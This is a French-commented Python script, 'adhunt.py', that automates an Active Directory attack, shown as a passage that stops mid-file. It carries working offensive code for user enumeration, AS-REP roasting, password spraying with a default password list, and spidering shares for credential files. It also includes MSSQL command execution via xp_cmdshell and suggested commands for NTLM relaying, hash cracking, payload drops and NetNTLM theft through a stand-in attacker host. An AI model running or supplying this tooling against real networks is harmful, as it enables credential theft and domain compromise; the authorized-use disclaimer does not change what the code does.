#!/usr/bin/env python3
"""
adhunt.py - Enumeration & pentest Active Directory de A a Z
===========================================================
Orchestrateur AD facon couteau suisse : deroule les phases d'un pentest AD,
pilote les vrais outils (netexec/nxc, impacket, ldap3, kerbrute, certipy,
bloodhound-python) quand ils sont presents, avec fallback PUR-PYTHON sinon.

  Phase 0  DECOUVERTE        : scan ports AD, repere les DC, rootDSE, SMB signing,
                               clock skew Kerberos (sonde SMB2 pur-python)
  Phase 1  ENUM NON-AUTH     : password policy, null session, RID cycling,
                               kerbrute (enum users), AS-REP roasting, LDAP anon
  Phase 2  MOT DE PASSE      : password spraying LOCKOUT-AWARE (auto-throttle)
  Phase 3  ENUM AUTH         : dump LDAP pur-python (kerberoastable/asrep/UAC/
                               deleg/descriptions), Kerberoast, GPP cpassword,
                               ADCS (certipy), delegations, BloodHound
  Phase 4  ESCALADE/LATERAL  : cartographie creds->hotes (nxc), admin local,
                               secretsdump (si --yes et pas --safe)
  Phase 5  RAPPORT           : report.md priorise + report.json + loot/

Usage :
    python adhunt.py 10.10.10.0/24                 # decouverte du subnet
    python adhunt.py dc01.corp.local --anon        # + enum anonyme
    python adhunt.py 10.10.10.10 -d corp.local -u user -p 'Pass1'  --all
    python adhunt.py 10.10.10.10 -d corp.local -u user -H <ntlmhash> --safe

[!] Usage AUTORISE uniquement (pentest/red team/CTF/lab). Rester DANS le scope.
"""

import argparse
import ipaddress
import json
import os
import re
import shutil
import socket
import struct
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

# ----------------------------------------------------------------------
class C:
    G = "\033[92m"; Y = "\033[93m"; R = "\033[91m"; B = "\033[94m"
    CY = "\033[96m"; GR = "\033[90m"; BD = "\033[1m"; X = "\033[0m"
if os.name == "nt":
    try:
        import ctypes
        k = ctypes.windll.kernel32
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
    except Exception:
        for a in ("G", "Y", "R", "B", "CY", "GR", "BD", "X"):
            setattr(C, a, "")

def log(m): print(m)

def stage(title):
    log(f"\n{C.B}{C.BD}{'='*68}{C.X}")
    log(f"{C.B}{C.BD}  {title}{C.X}")
    log(f"{C.B}{C.BD}{'='*68}{C.X}")

AUDIT = None  # fichier d'audit ouvert dans main()
def audit(line):
    if AUDIT:
        AUDIT.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')}  {line}\n")
        AUDIT.flush()

def have(tool):
    """Vrai outil externe present dans le PATH ?"""
    return shutil.which(tool) is not None

def have_lib(name):
    try:
        __import__(name)
        return True
    except Exception:
        return False

# ----------------------------------------------------------------------
# Ports AD d'interet
# ----------------------------------------------------------------------
AD_PORTS = {
    53:   "DNS",
    88:   "Kerberos",
    135:  "RPC/EPM",
    139:  "NetBIOS",
    389:  "LDAP",
    445:  "SMB",
    464:  "kpasswd",
    636:  "LDAPS",
    3268: "GC/LDAP",
    3269: "GC/LDAPS",
    5985: "WinRM",
    5986: "WinRM-S",
    3389: "RDP",
    1433: "MSSQL",
    9389: "ADWS",
}
# signaux forts de Domain Controller (Kerberos + LDAP + SMB, souvent GC)
DC_SIGNAL = {88, 389, 445}

# ----------------------------------------------------------------------
# Scan de ports (pur python, threade)
# ----------------------------------------------------------------------
def scan_host(ip, ports, timeout=1.2):
    open_ports = []
    for port in ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except Exception:
            pass
    return ip, open_ports

def scan_network(hosts, ports, threads=100, timeout=1.2):
    results = {}
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(scan_host, h, ports, timeout): h for h in hosts}
        done = 0
        for fu in as_completed(futs):
            done += 1
            if done % 32 == 0:
                sys.stdout.write(f"\r{C.GR}    scan {done}/{len(hosts)}{C.X}")
                sys.stdout.flush()
            ip, op = fu.result()
            if op:
                results[ip] = op
    sys.stdout.write("\r" + " " * 40 + "\r")
    return results

# ----------------------------------------------------------------------
# Sonde SMB2 brute (pur python) : signing requis ? + clock skew + dialecte
# On envoie un SMB2 NEGOTIATE minimal et on lit la reponse.
# ----------------------------------------------------------------------
SMB2_DIALECTS = [0x0202, 0x0210, 0x0300, 0x0302]

def _smb2_negotiate_packet():
    # En-tete SMB2 (64 octets)
    hdr = b"\xfeSMB"                 # ProtocolId
    hdr += struct.pack("<H", 64)     # StructureSize
    hdr += struct.pack("<H", 0)      # CreditCharge
    hdr += struct.pack("<I", 0)      # Status
    hdr += struct.pack("<H", 0)      # Command = NEGOTIATE
    hdr += struct.pack("<H", 0)      # Credits
    hdr += struct.pack("<I", 0)      # Flags
    hdr += struct.pack("<I", 0)      # NextCommand
    hdr += struct.pack("<Q", 0)      # MessageId
    hdr += struct.pack("<I", 0)      # Reserved
    hdr += struct.pack("<I", 0)      # TreeId
    hdr += struct.pack("<Q", 0)      # SessionId
    hdr += b"\x00" * 16              # Signature
    # Corps NEGOTIATE
    body = struct.pack("<H", 36)                     # StructureSize
    body += struct.pack("<H", len(SMB2_DIALECTS))    # DialectCount
    body += struct.pack("<H", 1)                     # SecurityMode = signing enabled
    body += struct.pack("<H", 0)                     # Reserved
    body += struct.pack("<I", 0)                     # Capabilities
    body += b"\x00" * 16                             # ClientGuid
    body += struct.pack("<Q", 0)                     # ClientStartTime
    for d in SMB2_DIALECTS:
        body += struct.pack("<H", d)
    smb = hdr + body
    # Transport Direct TCP : 1 octet zero + 3 octets longueur
    return struct.pack(">I", len(smb)) + smb

def smb2_probe(ip, timeout=3):
    """Renvoie {signing_required, system_time (epoch), dialect} ou None."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect((ip, 445))
        s.sendall(_smb2_negotiate_packet())
        # lit la longueur (4 octets transport) puis le corps
        hdr = b""
        while len(hdr) < 4:
            chunk = s.recv(4 - len(hdr))
            if not chunk:
                return None
            hdr += chunk
        total = struct.unpack(">I", hdr)[0]
        data = b""
        while len(data) < total:
            chunk = s.recv(total - len(data))
            if not chunk:
                break
            data += chunk
        s.close()
        if len(data) < 64 + 64 or data[:4] != b"\xfeSMB":
            return None
        body = data[64:]  # apres l'en-tete SMB2
        sec_mode = struct.unpack("<H", body[2:4])[0]
        dialect = struct.unpack("<H", body[4:6])[0]
        # Corps NEGOTIATE response : StructSize(2) SecMode(2) Dialect(2) CtxCount(2)
        # ServerGuid(16) Capabilities(4) MaxTrans(4) MaxRead(4) MaxWrite(4)
        # SystemTime(8)@40 ServerStartTime(8)@48
        filetime = struct.unpack("<Q", body[40:48])[0]
        epoch = filetime / 1e7 - 11644473600 if filetime else 0
        return {"signing_required": bool(sec_mode & 0x2),
                "system_time": epoch, "dialect": dialect}
    except Exception:
        return None

DIALECT_NAME = {0x0202: "SMB 2.0.2", 0x0210: "SMB 2.1", 0x0300: "SMB 3.0",
                0x0302: "SMB 3.0.2", 0x0311: "SMB 3.1.1"}

# ----------------------------------------------------------------------
# LDAP rootDSE anonyme (via ldap3 si dispo)
# ----------------------------------------------------------------------
def ldap_rootdse(ip, timeout=5):
    if not have_lib("ldap3"):
        return None
    try:
        from ldap3 import Server, Connection, ALL, BASE
        srv = Server(ip, get_info=ALL, connect_timeout=timeout)
        conn = Connection(srv, auto_bind=True, receive_timeout=timeout)
        conn.search("", "(objectClass=*)", search_scope=BASE,
                    attributes=["defaultNamingContext", "rootDomainNamingContext",
                                "dnsHostName", "ldapServiceName", "serverName",
                                "domainFunctionality", "forestFunctionality",
                                "supportedSASLMechanisms"])
        info = {}
        if conn.entries:
            e = conn.entries[0]
            for a in ("defaultNamingContext", "rootDomainNamingContext",
                      "dnsHostName", "ldapServiceName", "serverName",
                      "domainFunctionality", "forestFunctionality"):
                v = getattr(e, a, None)
                if v and str(v):
                    info[a] = str(v)
        conn.unbind()
        return info or None
    except Exception:
        return None

def dn_to_domain(dn):
    """DC=corp,DC=local -> corp.local"""
    if not dn:
        return None
    parts = re.findall(r"DC=([^,]+)", dn, re.I)
    return ".".join(parts) if parts else None

# ----------------------------------------------------------------------
# Enum SMB null (via impacket si dispo) : OS, domaine, hostname
# ----------------------------------------------------------------------
def smb_null_info(ip, timeout=5):
    if not have_lib("impacket"):
        return None
    try:
        from impacket.smbconnection import SMBConnection
        conn = SMBConnection(ip, ip, timeout=timeout)
        try:
            conn.login("", "")  # session null
        except Exception:
            pass
        info = {"os": conn.getServerOS(), "hostname": conn.getServerName(),
                "domain": conn.getServerDomain() or conn.getServerDNSDomainName(),
                "dns_hostname": None}
        try:
            info["dns_hostname"] = conn.getServerDNSHostName()
        except Exception:
            pass
        try:
            conn.logoff()
        except Exception:
            pass
        return {k: v for k, v in info.items() if v}
    except Exception:
        return None

# ----------------------------------------------------------------------
# PHASE 0 : DECOUVERTE
# ----------------------------------------------------------------------
def phase0_discovery(targets, args):
    stage("PHASE 0 - DECOUVERTE")
    ports = sorted(p for p in AD_PORTS if p < 65536)
    log(f"{C.GR}[i] Scan de {len(targets)} hote(s) sur {len(ports)} ports AD...{C.X}")
    audit(f"PHASE0 scan {len(targets)} hosts")
    found = scan_network(targets, ports, threads=args.threads, timeout=args.timeout)
    if not found:
        log(f"{C.R}[!] Aucun hote avec un port AD ouvert. Verifie le reseau/scope.{C.X}")
        return {}

    hosts = {}
    dcs = []
    for ip in sorted(found, key=lambda x: tuple(int(o) for o in x.split("."))
                     if re.match(r"^\d+\.\d+\.\d+\.\d+$", x) else (0,)):
        op = found[ip]
        is_dc = DC_SIGNAL.issubset(set(op)) or 3268 in op or 464 in op
        rec = {"ip": ip, "ports": op, "is_dc": is_dc,
               "services": {p: AD_PORTS[p] for p in op if p in AD_PORTS}}
        # enrichissement sur SMB
        if 445 in op:
            smb = smb2_probe(ip)
            if smb:
                rec["smb_signing_required"] = smb["signing_required"]
                rec["smb_dialect"] = DIALECT_NAME.get(smb["dialect"], hex(smb["dialect"]))
                rec["server_time"] = smb["system_time"]
                if smb["system_time"]:
                    skew = smb["system_time"] - time.time()
                    rec["clock_skew_sec"] = round(skew)
            nfo = smb_null_info(ip)
            if nfo:
                rec.update({f"smb_{k}": v for k, v in nfo.items()})
        # enrichissement LDAP (surtout DC)
        if is_dc or 389 in op:
            rd = ldap_rootdse(ip)
            if rd:
                rec["ldap"] = rd
                dom = dn_to_domain(rd.get("defaultNamingContext"))
                forest = dn_to_domain(rd.get("rootDomainNamingContext"))
                if dom: rec["domain"] = dom
                if forest: rec["forest"] = forest
                if rd.get("dnsHostName"): rec["dns_hostname"] = rd["dnsHostName"]
        hosts[ip] = rec
        if is_dc:
            dcs.append(ip)

    # affichage
    for ip, rec in hosts.items():
        tag = f"{C.R}{C.BD}[DC]{C.X} " if rec["is_dc"] else ""
        svc = " ".join(f"{p}/{AD_PORTS.get(p,'?')}" for p in rec["ports"])
        log(f"\n  {tag}{C.G}{C.BD}{ip}{C.X}  {C.GR}{svc}{C.X}")
        name = rec.get("dns_hostname") or rec.get("smb_hostname")
        if name:
            log(f"      hote     : {C.CY}{name}{C.X}")
        if rec.get("domain"):
            log(f"      domaine  : {C.CY}{rec['domain']}{C.X}"
                + (f"   foret: {rec['forest']}" if rec.get("forest") else ""))
        if rec.get("smb_os"):
            log(f"      OS       : {rec['smb_os']}")
        if "smb_signing_required" in rec:
            sr = rec["smb_signing_required"]
            col = C.G if sr else C.R
            extra = "" if sr else f"  {C.R}{C.BD}<- RELAIS NTLM POSSIBLE{C.X}"
            log(f"      SMB      : {rec.get('smb_dialect','?')}  | signing requis: "
                f"{col}{sr}{C.X}{extra}")
        if "clock_skew_sec" in rec:
            sk = rec["clock_skew_sec"]
            col = C.G if abs(sk) < 120 else C.R
            warn = "" if abs(sk) < 300 else f"  {C.R}<- Kerberos KO (>5min), sync l'horloge{C.X}"
            log(f"      horloge  : ecart {col}{sk:+d}s{C.X}{warn}")

    # synthese
    log(f"\n{C.CY}{C.BD}[=] {len(hosts)} hote(s) AD, dont {len(dcs)} DC : "
        f"{', '.join(dcs) if dcs else 'aucun identifie'}{C.X}")
    relayable = [ip for ip, r in hosts.items() if r.get("smb_signing_required") is False]
    if relayable:
        log(f"{C.R}{C.BD}[!] Signing SMB non requis sur {len(relayable)} hote(s) "
            f"-> surface de relais NTLM (ntlmrelayx).{C.X}")
    # auto-detection du domaine si non fourni
    if not args.domain:
        for r in hosts.values():
            if r.get("domain"):
                args.domain = r["domain"]
                log(f"{C.GR}[i] Domaine auto-detecte : {args.domain}{C.X}")
                break
    return hosts

# ======================================================================
# HELPERS communs aux phases actives
# ======================================================================
import subprocess

def run_cmd(cmd, timeout=300, feed=None):
    """Lance une commande externe, renvoie (rc, stdout, stderr)."""
    audit("CMD " + " ".join(str(c) for c in cmd))
    try:
        pr = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                            input=feed, errors="ignore")
        return pr.returncode, pr.stdout or "", pr.stderr or ""
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -1, "", str(e)

def nxc_bin():
    for b in ("nxc", "netexec", "crackmapexec"):
        if have(b):
            return b
    return None

def nxc_version():
    b = nxc_bin()
    if not b:
        return None
    rc, out, err = run_cmd([b, "--version"], 15)
    return (out or err).strip().splitlines()[0] if (out or err).strip() else "?"

def nxc_auth(args, null=False):
    """Arguments d'authentification pour nxc."""
    if null:
        return ["-u", "", "-p", ""]
    a = []
    if args.user:
        a += ["-u", args.user]
    if args.nthash:
        a += ["-H", args.nthash]
    elif args.password is not None:
        a += ["-p", args.password]
    if args.kerberos:
        a += ["-k"]
    return a

def nt_full(h):
    """Normalise un hash NTLM en LM:NT pour impacket/ldap3."""
    return h if ":" in h else "aad3b435b51404eeaad3b435b51404ee:" + h

def impacket_creds(args):
    """(target_prefix, extra_args) pour les scripts impacket."""
    dom = args.domain or ""
    if args.nthash:
        return f"{dom}/{args.user}", ["-hashes", nt_full(args.nthash)]
    return f"{dom}/{args.user}:{args.password or ''}", []

def first_dc(hosts):
    for ip, r in hosts.items():
        if r.get("is_dc"):
            return ip
    return next(iter(hosts), None)

def effective_creds(args, state):
    """Creds a utiliser pour les phases auth : args en priorite, sinon celles trouvees."""
    if args.user and (args.password or args.nthash or args.kerberos):
        return True
    for c in state.get("creds", []):
        args.user = c.get("user"); args.password = c.get("password")
        args.nthash = c.get("hash")
        log(f"{C.GR}[i] Utilisation des creds trouvees : {args.user}{C.X}")
        return True
    return False

def add_finding(state, sev, title, detail="", host=""):
    state.setdefault("findings", []).append(
        {"sev": sev, "title": title, "detail": detail, "host": host})
    col = {"CRIT": C.R, "HIGH": C.R, "MED": C.Y, "INFO": C.GR}.get(sev, C.GR)
    log(f"    {col}{C.BD}[{sev}]{C.X} {title}" + (f" {C.GR}({host}){C.X}" if host else ""))

def save_loot(args, name, content):
    path = os.path.join(args.loot, name)
    with open(path, "w", encoding="utf-8") as f:
        f.write(content)
    return path

def ldap_bind(args, dc_ip, timeout=6):
    """Bind LDAP authentifie (ldap3, NTLM ou pass-the-hash)."""
    if not have_lib("ldap3"):
        return None
    if not args.user or (args.password is None and not args.nthash):
        log(f"{C.Y}[i] Bind LDAP saute : creds incompletes (-u + -p/-H requis).{C.X}")
        return None
    try:
        from ldap3 import Server, Connection, ALL, NTLM
        srv = Server(dc_ip, get_info=ALL, connect_timeout=timeout)
        user = f"{args.domain}\\{args.user}"
        pw = nt_full(args.nthash) if args.nthash else args.password
        conn = Connection(srv, user=user, password=pw, authentication=NTLM,
                          auto_bind=True, receive_timeout=timeout)
        return conn
    except Exception as e:
        log(f"{C.GR}    (bind LDAP echoue : {e}){C.X}")
        return None

def ldap_search_all(conn, base, filt, attrs, controls=None, page=500):
    """Recherche LDAP AVEC pagination complete (cookie) : ne tronque plus a 500/1000.
    Renvoie la liste de toutes les entrees."""
    from ldap3 import SUBTREE
    out, cookie = [], None
    while True:
        conn.search(base, filt, search_scope=SUBTREE, attributes=attrs,
                    paged_size=page, paged_cookie=cookie, controls=controls)
        out.extend(conn.entries)
        try:
            cookie = conn.result["controls"]["1.2.840.113556.1.4.319"]["value"]["cookie"]
        except Exception:
            cookie = None
        if not cookie:
            break
    return out

UAC = {0x0002: "DISABLED", 0x0010: "LOCKOUT", 0x0020: "PWD_NOTREQD",
       0x10000: "PWD_NEVER_EXPIRES", 0x80000: "TRUSTED_FOR_DELEGATION",
       0x100000: "NOT_DELEGATED", 0x400000: "DONT_REQ_PREAUTH",
       0x1000000: "TRUSTED_TO_AUTH_FOR_DELEGATION"}
def uac_flags(v):
    try:
        v = int(v)
    except Exception:
        return []
    return [name for bit, name in UAC.items() if v & bit]

# ======================================================================
# PHASE 1 : ENUM NON-AUTHENTIFIEE
# ======================================================================
def phase1_unauth(hosts, args, state):
    stage("PHASE 1 - ENUM NON-AUTHENTIFIEE")
    dc = first_dc(hosts)
    if not dc:
        log(f"{C.R}[!] Pas de DC identifie -> phase 1 limitee.{C.X}")
        return
    nxc = nxc_bin()
    users = set()

    # userlist fournie (ex: THM Attacktive Directory ou l'OSINT) -> seed
    if getattr(args, "userlist", None) and os.path.isfile(args.userlist):
        with open(args.userlist, encoding="utf-8", errors="ignore") as f:
            for line in f:
                u = line.strip()
                if u and not u.startswith("#"):
                    users.add(u.split("@")[0].split("\\")[-1])
        log(f"{C.GR}[i] Userlist chargee : {len(users)} utilisateur(s) (seed).{C.X}")

    # surface de relais/coercion (depuis phase 0)
    for ip, r in hosts.items():
        if r.get("smb_signing_required") is False:
            add_finding(state, "HIGH", "SMB signing non requis (relais NTLM)",
                        "ntlmrelayx.py -tf targets -smb2support", ip)
    # surface de poisoning (position reseau interne)
    add_finding(state, "INFO", "LLMNR/NBT-NS/mDNS poisoning (position reseau)",
                "responder -I <iface> -wv -> capture NetNTLMv2 -> hashcat -m 5600 / relais")

    # 1) password policy (AVANT tout spray) + null session
    if nxc:
        log(f"{C.GR}[i] {nxc} : password policy + null session sur {dc}...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + ["--pass-pol"], 120)
        m = re.search(r"Lockout Threshold\s*:?\s*(\d+|None)", out, re.I)
        if m:
            thr = m.group(1)
            state["lockout_threshold"] = None if thr.lower() == "none" else int(thr)
            log(f"    {C.CY}Lockout threshold : {thr}{C.X}")
        # shares + users + groups en null
        for flag, key in (("--shares", "shares"), ("--users", "users"), ("--groups", "groups")):
            rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + [flag], 120)
            if flag == "--users":
                for mu in re.finditer(r"\\([A-Za-z0-9._$-]+)\s", out):
                    users.add(mu.group(1))
            if out.strip() and ("SHARE" in out or "-Username-" in out or "READ" in out):
                log(f"    {C.G}null session {flag} : reponse obtenue{C.X}")
                if flag == "--shares":
                    add_finding(state, "MED", "Null session SMB autorisee (shares listables)",
                                "nxc smb <dc> -u '' -p '' --shares", dc)
        # 2) RID cycling
        log(f"{C.GR}[i] {nxc} : RID cycling (--rid-brute)...{C.X}")
        rc, out, _ = run_cmd([nxc, "smb", dc] + nxc_auth(args, null=True) + ["--rid-brute"], 180)
        for mu in re.finditer(r":\s*[A-Za-z0-9.-]+\\([A-Za-z0-9._$-]+)\s*\(SidTypeUser\)", out):
            users.add(mu.group(1))
    elif have("enum4linux-ng"):
        log(f"{C.GR}[i] enum4linux-ng sur {dc}...{C.X}")
        rc, out, _ = run_cmd(["enum4linux-ng", "-A", dc], 300)
        for mu in re.finditer(r"username:\s*([A-Za-z0-9._$-]+)", out):
            users.add(mu.group(1))
    elif have("rpcclient"):
        log(f"{C.GR}[i] rpcclient (null session) sur {dc}...{C.X}")
        rc, out, _ = run_cmd(["rpcclient", "-U", "", "-N", dc, "-c", "enumdomusers"], 120)
        for mu in re.finditer(r"user:\[([^\]]+)\]", out):
            users.add(mu.group(1))
    else:
        log(f"{C.Y}[i] nxc/netexec absent -> null session/RID cycling limites. "
            f"(pip/apt: netexec){C.X}")

    # LDAP anonyme (dump users)
    if have_lib("ldap3"):
        rd = ldap_rootdse(dc)
        if rd and rd.get("defaultNamingContext"):
            try:
                from ldap3 import Server, Connection, SUBTREE
                srv = Server(dc)
                conn = Connection(srv, auto_bind=True, receive_timeout=6)
                ok = conn.search(rd["defaultNamingContext"], "(objectClass=user)",
                                 search_scope=SUBTREE, attributes=["sAMAccountName"])
                if ok and conn.entries:
                    for e in conn.entries:
                        s = str(getattr(e, "sAMAccountName", "") or "")
                        if s:
                            users.add(s)
                    add_finding(state, "MED", "LDAP anonymous bind autorise (dump users)",
                                f"{len(conn.entries)} objets user lus en anonyme", dc)
                conn.unbind()
            except Exception:
                pass

    users = sorted(u for u in users if u and not u.endswith("$"))
    if users:
        p = save_loot(args, "users.txt", "\n".join(users) + "\n")
        state["users"] = users
        log(f"\n{C.CY}{C.BD}[=] {len(users)} utilisateur(s) -> {p}{C.X}")

    # kerbrute userenum (sans lockout)
    if have("kerbrute") and users and args.domain:
        log(f"{C.GR}[i] kerbrute userenum ({len(users)} users, sans lockout)...{C.X}")
        rc, out, _ = run_cmd(["kerbrute", "userenum", "-d", args.domain, "--dc", dc,
                              os.path.join(args.loot, "users.txt")], 300)
        valid = re.findall(r"VALID USERNAME:\s+([A-Za-z0-9._-]+)@", out)
        if valid:
            log(f"    {C.G}{len(valid)} username(s) valide(s) confirme(s){C.X}")

    # AS-REP roasting (sans creds)
    phase_asrep(dc, args, state, label="non-auth")
    # l'AS-REP est un gain SANS creds -> on crack tout de suite (nourrit la suite)
    if state.get("hashes"):
        crack_hashes(args, state)

def phase_asrep(dc, args, state, label=""):
    """AS-REP roasting : comptes DONT_REQ_PREAUTH -> hash crackable."""
    if not (args.domain and os.path.isfile(os.path.join(args.loot, "users.txt"))):
        return
    outfile = os.path.join(args.loot, "asrep.hashes")
    if have("GetNPUsers.py"):
        log(f"{C.GR}[i] AS-REP roasting (GetNPUsers, {label})...{C.X}")
        rc, out, _ = run_cmd(["GetNPUsers.py", f"{args.domain}/", "-no-pass", "-dc-ip", dc,
                              "-usersfile", os.path.join(args.loot, "users.txt"),
                              "-format", "hashcat", "-outputfile", outfile], 300)
        if os.path.isfile(outfile) and os.path.getsize(outfile) > 0:
            n = len(open(outfile, encoding="utf-8", errors="ignore").read().splitlines())
            add_finding(state, "HIGH", f"AS-REP roasting : {n} compte(s) sans pre-auth",
                        f"hashcat -m 18200 {outfile} rockyou.txt", dc)
            state.setdefault("hashes", {})["asrep"] = outfile
    else:
        log(f"{C.GR}[i] GetNPUsers.py (impacket) absent -> AS-REP roast saute.{C.X}")

# ======================================================================
# PHASE 2 : ATTAQUE DE MOT DE PASSE (spray lockout-aware)
# ======================================================================
def default_passwords(args):
    import datetime
    y = datetime.date.today().year
    seasons = ["Spring", "Summer", "Autumn", "Fall", "Winter",
               "Printemps", "Ete", "Automne", "Hiver"]
    pw = []
    for s in seasons:
        pw += [f"{s}{y}", f"{s}{y}!", f"{s}{y-1}", f"{s}{y-1}!"]
    comp = (args.domain or "").split(".")[0].capitalize()
    if comp:
        pw += [f"{comp}123", f"{comp}123!", f"{comp}2024", f"{comp}2025!", f"{comp}@123"]
    pw += ["Password1", "Password1!", "Password123", "Welcome1", "Welcome123!",
           "Changeme123", "P@ssw0rd", "P@ssw0rd!", "Company123!"]
    return list(dict.fromkeys(pw))

def phase2_password(hosts, args, state):
    stage("PHASE 2 - ATTAQUE DE MOT DE PASSE")
    dc = first_dc(hosts)
    nxc = nxc_bin()
    users = state.get("users") or []
    if not users:
        log(f"{C.Y}[i] Pas de userlist (phase 1) -> spray saute.{C.X}")
        return
    if not nxc:
        log(f"{C.Y}[i] nxc/netexec absent -> spray saute. Alternative: kerbrute passwordspray.{C.X}")
        return
    thr = state.get("lockout_threshold")
    log(f"{C.GR}[i] Lockout threshold connu : {thr}{C.X}")
    passwords = default_passwords(args)
    # lockout-aware : on limite le nombre de mots de passe testes
    if thr and thr > 0:
        safe_n = max(1, thr - 2)
        if len(passwords) > safe_n:
            log(f"{C.R}[!] Lockout={thr} -> on limite a {safe_n} mot(s) de passe "
                f"pour NE PAS bloquer les comptes.{C.X}")
            passwords = passwords[:safe_n]
    else:
        log(f"{C.Y}[!] Lockout inconnu/illimite -> prudence, {len(passwords)} mdp.{C.X}")

    # userlist -> fichier
    ufile = os.path.join(args.loot, "users.txt")
    log(f"{C.GR}[i] Spraying {len(passwords)} mdp x {len(users)} users (continue-on-success)...{C.X}")
    found = []
    for pw in passwords:
        rc, out, _ = run_cmd([nxc, "smb", dc, "-u", ufile, "-p", pw,
                             "--continue-on-success"] + (["-d", args.domain] if args.domain else []), 300)
        for m in re.finditer(r"\[\+\]\s*([^\\\s]+)\\([^\s:]+):(\S+)", out):
            cred = {"user": m.group(2), "password": pw, "hash": None}
            if cred not in found:
                found.append(cred)
                add_finding(state, "HIGH", f"Cred valide : {m.group(2)}:{pw}",
                            "reutilisable en phase 3 (enum auth)", dc)
        time.sleep(0.3)  # throttle leger
    if found:
        state.setdefault("creds", []).extend(found)
        save_loot(args, "valid_creds.txt",
                  "\n".join(f"{c['user']}:{c['password']}" for c in found) + "\n")
        log(f"\n{C.G}{C.BD}[=] {len(found)} cred(s) valide(s) !{C.X}")
    else:
        log(f"{C.GR}[i] Aucune cred trouvee par spray.{C.X}")

# ======================================================================
# SHARES : enum authentifie + spider des fichiers sensibles
# (le classique CTF : creds en clair dans un .config / .ps1 / unattend.xml)
# ======================================================================
DEFAULT_SHARES = {"admin$", "c$", "ipc$", "print$"}
# motifs de fichiers a haute valeur (creds/config/scripts/secrets)
SPIDER_REGEX = (r"(?i)(passw|cred|secret|unattend|sysprep|autologon|\.kdbx|\.ppk|"
                r"id_rsa|\.pem|web\.config|app\.config|\.ps1|\.bat|\.vbs|\.ini|"
                r"backup|\.bak|\.config|vnc|\.git)")

def enum_shares(args, state, hosts):
    nxc = nxc_bin()
    if not nxc:
        log(f"{C.Y}[i] nxc absent -> enum/spider des shares saute.{C.X}")
        return
    ips = list(hosts.keys())
    tf = save_loot(args, "hosts.txt", "\n".join(ips) + "\n")
    auth = nxc_auth(args) + (["-d", args.domain] if args.domain else [])

    # 1) lister les shares accessibles (READ/WRITE) sur tous les hotes
    ver = nxc_version()
    log(f"{C.GR}[i] {nxc} ({ver}) : enum des shares sur {len(ips)} hote(s)...{C.X}")
    rc, out, _ = run_cmd([nxc, "smb", tf] + auth + ["--shares"], 300)
    # si le parsing casse sur une version recente, on saura pourquoi (readable vide)
    readable = {}   # host -> [shares interessants]
    writable = []
    for line in out.splitlines():
        m = re.search(r"(\d+\.\d+\.\d+\.\d+).*?\s(\S+)\s+(READ(?:,WRITE)?|WRITE)\s*", line)
        if not m:
            continue
        host, share, perm = m.group(1), m.group(2), m.group(3)
        if share.lower() in DEFAULT_SHARES:
            continue
        readable.setdefault(host, []).append((share, perm))
        if "WRITE" in perm:
            writable.append(f"{host}\\{share}")
    for host, shares in readable.items():
        for share, perm in shares:
            add_finding(state, "MED" if perm == "READ" else "HIGH",
                        f"Share accessible ({perm}) : \\\\{host}\\{share}",
                        "a spider pour des creds/configs", host)
    if writable:
        add_finding(state, "HIGH", f"Share(s) inscriptibles : {len(writable)}",
                    ", ".join(writable[:5]) + " (drop payload / SCF / .lnk)")

    # 2) spider les shares interessants pour des fichiers sensibles
    hits = []
    for host, shares in readable.items():
        for share, _ in shares:
            rc, out, _ = run_cmd([nxc, "smb", host] + auth +
                                 ["--spider", share, "--regex", SPIDER_REGEX], 240)
            for m in re.finditer(r"//[^\s]+/[^\s]+|\[.*?\]\s*(\S+\.(?:config|ps1|xml|ini|kdbx|bat|vbs|bak|pem))", out):
                f = m.group(0)
                if f and f not in hits:
                    hits.append(f)
    # fallback module spider_plus (dump metadata) si dispo
    if not readable:
        run_cmd([nxc, "smb", tf] + auth + ["-M", "spider_plus"], 300)
    if hits:
        p = save_loot(args, "sensitive_files.txt", "\n".join(hits) + "\n")
        add_finding(state, "HIGH", f"{len(hits)} fichier(s) sensible(s) sur les shares",
                    f"voir {p} -> telecharge et cherche des creds en clair")
        state.setdefault("loot_files", []).extend(hits[:50])
        log(f"\n{C.G}{C.BD}[=] {len(hits)} fichier(s) sensible(s) -> {p}{C.X}")
    else:
        log(f"{C.GR}[i] Pas de fichier sensible evident au spider (fouille manuelle recommandee).{C.X}")

# ======================================================================
# ENUM AVANCEE : MSSQL, LAPS, gMSA, trusts (inspire HackTricks / HTB)
# ======================================================================
def enum_mssql(args, state, hosts):
    """MSSQL : sysadmin -> xp_cmdshell RCE, liens de serveurs, vol NetNTLM."""
    mssql = [ip for ip, r in hosts.items() if 1433 in r.get("ports", [])]
    if not mssql:
        return
    nxc = nxc_bin()
    if not nxc:
        add_finding(state, "INFO", f"MSSQL sur {len(mssql)} hote(s)",
                    "mssqlclient.py domain/user:pass@host -windows-auth  (enum_links, xp_cmdshell)")
        return
    log(f"{C.GR}[i] {nxc} : enum MSSQL sur {len(mssql)} hote(s)...{C.X}")
    for host in mssql:
        rc, out, _ = run_cmd([nxc, "mssql", host] + nxc_auth(args) +
                             (["-d", args.domain] if args.domain else []), 120)
        if re.search(r"Pwn3d|sysadmin|\(admin\)", out, re.I):
            add_finding(state, "CRIT", f"MSSQL sysadmin sur {host} -> xp_cmdshell (RCE)",
                        "nxc mssql host -u.. -p.. -x whoami  (ou enable xp_cmdshell)", host)
            if _gate(args):
                run_cmd([nxc, "mssql", host] + nxc_auth(args) +
                        (["-d", args.domain] if args.domain else []) + ["-x", "whoami"], 120)
        elif "[+]" in out:
            add_finding(state, "MED", f"Acces MSSQL sur {host}",
                        "liens de serveurs (cross-forest) + vol NetNTLM (xp_dirtree \\\\attacker\\x)", host)

def read_laps(conn, base, state):
